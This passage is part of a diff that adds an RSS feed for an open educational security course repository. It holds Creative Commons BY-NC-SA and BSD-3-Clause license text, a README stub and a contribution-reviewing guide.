+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> information.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 3. If requested by the Licensor, You must remove any of the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> information required by Section 3(a)(1)(A) to the extent
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reasonably practicable.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. ShareAlike.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> In addition to the conditions in Section 3(a), if You Share
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Adapted Material You produce, the following conditions also apply.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 1. The Adapter&amp;#39;s License You apply must be a Creative Commons
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> license with the same License Elements, this version or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> later, or a BY-NC-SA Compatible License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 2. You must include the text of, or the URI or hyperlink to, the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Adapter&amp;#39;s License You apply. You may satisfy this condition
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> in any reasonable manner based on the medium, means, and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> context in which You Share Adapted Material.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 3. You may not offer or impose any additional or different terms
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> or conditions on, or apply any Effective Technological
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Measures to, Adapted Material that restrict exercise of the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rights granted under the Adapter&amp;#39;s License You apply.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Section 4 -- Sui Generis Database Rights.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Where the Licensed Rights include Sui Generis Database Rights that
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apply to Your use of the Licensed Material:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. for the avoidance of doubt, Section 2(a)(1) grants You the right
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> to extract, reuse, reproduce, and Share all or a substantial
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> portion of the contents of the database for NonCommercial purposes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> only;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. if You include all or a substantial portion of the database
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> contents in a database in which You have Sui Generis Database
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Rights, then the database in which You have Sui Generis Database
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Rights (but not its individual contents) is Adapted Material,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> including for purposes of Section 3(b); and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c. You must comply with the conditions in Section 3(a) if You Share
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> all or a substantial portion of the contents of the database.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>For the avoidance of doubt, this Section 4 supplements and does not
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>replace Your obligations under this Public License where the Licensed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Rights include other Copyright and Similar Rights.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Section 5 -- Disclaimer of Warranties and Limitation of Liability.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. UNLESS OTHERWISE SEPARATELY UNDERTAKEN BY THE LICENSOR, TO THE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> EXTENT POSSIBLE, THE LICENSOR OFFERS THE LICENSED MATERIAL AS-IS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AND AS-AVAILABLE, AND MAKES NO REPRESENTATIONS OR WARRANTIES OF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ANY KIND CONCERNING THE LICENSED MATERIAL, WHETHER EXPRESS,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IMPLIED, STATUTORY, OR OTHER. THIS INCLUDES, WITHOUT LIMITATION,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WARRANTIES OF TITLE, MERCHANTABILITY, FITNESS FOR A PARTICULAR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PURPOSE, NON-INFRINGEMENT, ABSENCE OF LATENT OR OTHER DEFECTS,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ACCURACY, OR THE PRESENCE OR ABSENCE OF ERRORS, WHETHER OR NOT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KNOWN OR DISCOVERABLE. WHERE DISCLAIMERS OF WARRANTIES ARE NOT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ALLOWED IN FULL OR IN PART, THIS DISCLAIMER MAY NOT APPLY TO YOU.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. TO THE EXTENT POSSIBLE, IN NO EVENT WILL THE LICENSOR BE LIABLE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TO YOU ON ANY LEGAL THEORY (INCLUDING, WITHOUT LIMITATION,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NEGLIGENCE) OR OTHERWISE FOR ANY DIRECT, SPECIAL, INDIRECT,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> INCIDENTAL, CONSEQUENTIAL, PUNITIVE, EXEMPLARY, OR OTHER LOSSES,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> COSTS, EXPENSES, OR DAMAGES ARISING OUT OF THIS PUBLIC LICENSE OR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USE OF THE LICENSED MATERIAL, EVEN IF THE LICENSOR HAS BEEN
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ADVISED OF THE POSSIBILITY OF SUCH LOSSES, COSTS, EXPENSES, OR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DAMAGES. WHERE A LIMITATION OF LIABILITY IS NOT ALLOWED IN FULL OR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IN PART, THIS LIMITATION MAY NOT APPLY TO YOU.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c. The disclaimer of warranties and limitation of liability provided
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> above shall be interpreted in a manner that, to the extent
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> possible, most closely approximates an absolute disclaimer and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> waiver of all liability.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Section 6 -- Term and Termination.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. This Public License applies for the term of the Copyright and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Similar Rights licensed here. However, if You fail to comply with
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> this Public License, then Your rights under this Public License
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> terminate automatically.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. Where Your right to use the Licensed Material has terminated under
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Section 6(a), it reinstates:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 1. automatically as of the date the violation is cured, provided
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> it is cured within 30 days of Your discovery of the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> violation; or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 2. upon express reinstatement by the Licensor.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> For the avoidance of doubt, this Section 6(b) does not affect any
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> right the Licensor may have to seek remedies for Your violations
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> of this Public License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c. For the avoidance of doubt, the Licensor may also offer the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensed Material under separate terms or conditions or stop
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> distributing the Licensed Material at any time; however, doing so
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> will not terminate this Public License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> d. Sections 1, 5, 6, 7, and 8 survive termination of this Public
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Section 7 -- Other Terms and Conditions.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. The Licensor shall not be bound by any additional or different
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> terms or conditions communicated by You unless expressly agreed.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. Any arrangements, understandings, or agreements regarding the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensed Material not stated herein are separate from and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> independent of the terms and conditions of this Public License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Section 8 -- Interpretation.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. For the avoidance of doubt, this Public License does not, and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shall not be interpreted to, reduce, limit, restrict, or impose
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conditions on any use of the Licensed Material that could lawfully
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> be made without permission under this Public License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. To the extent possible, if any provision of this Public License is
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> deemed unenforceable, it shall be automatically reformed to the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> minimum extent necessary to make it enforceable. If the provision
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cannot be reformed, it shall be severed from this Public License
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> without affecting the enforceability of the remaining terms and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conditions.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c. No term or condition of this Public License will be waived and no
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> failure to comply consented to unless expressly agreed to by the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensor.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> d. Nothing in this Public License constitutes or may be interpreted
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> as a limitation upon, or waiver of, any privileges and immunities
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> that apply to the Licensor or You, including from the legal
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> processes of any jurisdiction or authority.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>=======================================================================
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Creative Commons is not a party to its public
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>licenses. Notwithstanding, Creative Commons may elect to apply one of
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>its public licenses to material it publishes and in those instances
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>will be considered the “Licensor.” The text of the Creative Commons
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public licenses is dedicated to the public domain under the CC0 Public
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain Dedication. Except for the limited purpose of indicating that
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>material is shared under a Creative Commons public license or as
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>otherwise permitted by the Creative Commons policies published at
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>creativecommons.org/policies, Creative Commons does not authorize the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>use of the trademark &amp;#34;Creative Commons&amp;#34; or any other trademark or logo
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>of Creative Commons without its prior written consent including,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>without limitation, in connection with any unauthorized modifications
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>to any of its public licenses or any other arrangements,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>understandings, or agreements concerning use of licensed material. For
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>the avoidance of doubt, this paragraph does not form part of the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public licenses.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Creative Commons may be contacted at creativecommons.org.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Copy of BSD-3-Clause:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>Copyright 2021 University POLITEHNICA of Bucharest
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redistribution and use in source and binary forms, with or without
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>modification, are permitted provided that the following conditions are met:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1. Redistributions of source code must retain the above copyright notice, this
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> list of conditions and the following disclaimer.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2. Redistributions in binary form must reproduce the above copyright notice,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> this list of conditions and the following disclaimer in the documentation
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> and/or other materials provided with the distribution.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3. Neither the name of the copyright holder nor the names of its contributors
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> may be used to endorse or promote products derived from this software
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> without specific prior written permission.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &amp;#34;AS IS&amp;#34; AND
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Essentials:</title><link>/essentials/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/readme/</guid><description>
+&lt;h1 id="essentials-security">Essentials Security&lt;/h1>
+&lt;p>These are open educational resources (&lt;a href="https://en.wikipedia.org/wiki/Open_educational_resources">OER&lt;/a>).
+The repository should be used as a template for the your own classes.&lt;/p>
+&lt;h2 id="using-the-content">Using the Content&lt;/h2>
+&lt;p>TODO&lt;/p>
+&lt;h2 id="chapter-contents">Chapter Contents&lt;/h2>
+&lt;p>TODO&lt;/p>
+&lt;h2 id="contributing">Contributing&lt;/h2>
+&lt;p>Contributions are welcome.
+See the &lt;a href="CONTRIBUTING.md">contribution guide&lt;/a> on how you could report or fix issues and on how you can improve the content.&lt;/p>
+&lt;p>Reviewers are requested to follow the &lt;a href="REVIEWING.md">reviewing guide&lt;/a>.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/reviewing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/reviewing/</guid><description>
+&lt;h1 id="reviewing-contributions">Reviewing Contributions&lt;/h1>
+&lt;p>These are recommendations when reviewing contributions to this repository.
+Contributions will mostly take the form of GitHub pull requests (PRs);
+issues and discussions are expected as well.&lt;/p>
+&lt;p>When reviewing contributions, please be civil and welcoming towards contributors.
+Contributions may not be in the best shape initially, but we appreciate time and effort spent in doing this.&lt;/p>
+&lt;p>Make sure contributions follow the &lt;a href="CONTRIBUTING.md">contribution guide&lt;/a>: proper formatting, proper wording, proper styling.
+See if the contributions fit into the scope of the repository and solve a problem or add value to it.&lt;/p>
+&lt;p>If a contribution is OK, please approve it.
+In case of a reviewed and approved PR, the assignee will then &lt;code>Rebase and merge&lt;/code> the PR.&lt;/p>
+&lt;p>If a contribution needs work, please make the appropriate comments.
+For a PR use discussion comments, or comments on the code / text, or directly &lt;a href="https://thenextweb.com/news/github-launches-suggested-changes-to-make-it-easier-to-collaborate-within-pull-requests">suggest changes&lt;/a>.&lt;/p></description></item></channel></rss>
